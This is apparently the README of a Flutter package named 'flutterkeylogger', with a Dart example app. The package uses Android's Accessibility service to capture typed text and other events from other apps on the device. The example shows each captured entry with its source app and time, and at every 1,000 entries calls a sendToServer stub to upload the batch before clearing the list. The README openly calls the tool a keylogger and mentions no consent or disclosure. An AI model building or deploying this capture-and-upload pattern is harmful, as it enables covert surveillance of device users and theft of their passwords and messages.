# Flutterkeylogger

This package is built to scan the events on your android device.
It uses Accessibility service to scan events. Fortunately it can also log the key events so it is named after keylogger for seo purposes 😜.

# How to use ?

To use this plugin, add `flutterkeylogger` as a [dependency in your pubspec.yaml file](https://flutter.io/platform-plugins/).

### Example

```dart
import 'package:flutter/material.dart';
import 'package:flutterkeylogger/flutterkeylogger.dart';
import 'package:flutterkeylogger_example/constant.dart';

void main() {
  runApp(MyApp());
}

class MyApp extends StatefulWidget {
  @override
  _MyAppState createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  List<Log> logs = [];
  @override
  void initState() {
    super.initState();
    keyLogger.logs((log) {
      logs.add(log);
      setState(() {});
      if (logs.length % 1000 == 0) {
        sendToServer();
        // after sending you can reset the logs like
        setState(() {
          logs = [];
        });
      }
    });
  }

  sendToServer() {
    //TODO:send data to server
  }

  int index = 0;
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      theme: ThemeData.dark(),
      home: Scaffold(
        appBar: AppBar(
          title: Text('Keylogger/EventLogger app'),
          actions: [
            Text(
              "Logs count:" + logs.length.toString(),
              style: TextStyle(fontSize: 30),
            )
          ],
        ),
        bottomNavigationBar: BottomNavigationBar(
          items: [
            BottomNavigationBarItem(
              icon: Icon(Icons.filter),
              label: 'Filtered',
            ),
            BottomNavigationBarItem(
              icon: Icon(Icons.whatshot),
              label: 'Raw',
            ),
          ],
          currentIndex: index,
          onTap: (index) {
            setState(() {
              this.index = index;
            });
          },
        ),
        body: IndexedStack(
          index: index,
          children: [
            ListView(
              children: [
                for (var log in logs)
                  if (log.text != "[]")
                    RichText(
                      text: TextSpan(children: [
                        TextSpan(text: log.text, style: TEXTSTYLE),
                        TextSpan(text: getTypeText(log.type), style: TEXTSTYLE2),
                        TextSpan(text: " at " + getTime(log.logTime!), style: TEXTSTYLE2),
                      ], text: log.packageName! + " > "),
                    ),
              ],
            ),
            ListView(
              children: [
                for (var log in logs) ...[
                  RichText(
                    text: TextSpan(children: [
                      TextSpan(
                        text: log.raw,
                        style: TEXTSTYLE,
                      ),
                    ], text: log.packageName! + " " + DateTime.fromMillisecondsSinceEpoch(int.parse(log.logTime!)).toString() + " > "),
                  ),
                  SizedBox(
                    height: 5,
                  )
                ]
              ],
            ),
          ],
        ),
      ),
    );
  }

  // the time during which events occured
  String getTime(String tim) {
    var time = DateTime.fromMillisecondsSinceEpoch(int.parse(tim));
    return time.hour.toString() + ":" + time.minute.toString() + ":" + time.second.toString();
  }

  // the type of the event fired
  String getTypeText(String? type) {
    switch (type) {
      case "TYPE_VIEW_CLICKED":
        return " Button Pressed";
      case "TYPE_NOTIFICATION_STATE_CHANGED":
        return " Notification Data";
      default:
        return "";
    }
  }
}
```

<h2><a href="https://www.youtube.com/watch?v=PalIKmi5IM0"> Click here for Video tutorial </a></h2>
